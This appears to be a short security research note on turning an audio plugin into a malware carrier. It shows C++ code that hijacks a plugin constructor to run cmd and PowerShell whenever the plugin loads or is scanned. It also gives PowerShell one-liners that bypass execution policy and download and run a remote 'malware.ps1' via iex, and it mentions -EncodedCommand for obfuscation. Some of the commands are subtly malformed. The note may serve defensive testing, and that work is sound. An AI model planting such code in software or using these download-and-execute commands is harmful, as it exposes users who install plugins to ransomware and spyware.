# Arbitrary Powershell Command Execution

Creates Weaknesses for: Ransomware, Spyware
Danger Status: Medium
Issue Exists?: Yes
Not Malware Scope?: No
Notes: Test RanSim
Tested?: Yes

Built using the SimpleAgain plugin example code as boilerplate

Possible by hijacking the plugin constructor method:

```jsx
GainParameter::GainParameter (int32 flags, int32 id)
{
	// Hijacking Constructor
	system("cmd.exe /c start calc.exe");
	system("powershell.exe");
	// ...
}
```

Send more dangerous PowerShell commands

```csharp
String payload = "cd ~\\Documents;echo \"write capabilities\">.\\execCheck.txt; Get-Content .\\execCheck.txt; whoami";
system("start powershell.exe "+payload+"; pause");
```

Triggers not only whenever plugin is loaded, but also during plugin scans:

![Untitled](Arbitrary%20Powershell%20Command%20Execution%20cfcbd3c8893e437a9d54e2a42838b60c/Untitled.png)

---

Run PowerShell Script String from web

```powershell
powershell.exe -ep Bypass -nop -noexit -c iex ((New ObjectNet.WebClient).DownloadString(‘https://[website]/malware.ps1′))
```

Get-Content from file

```powershell
powershell.exe –ep Bypass “& {Get-Content .\malware.ps2 | iex}
```

-EncodedCommand creates obfuscation and easier binary implimentation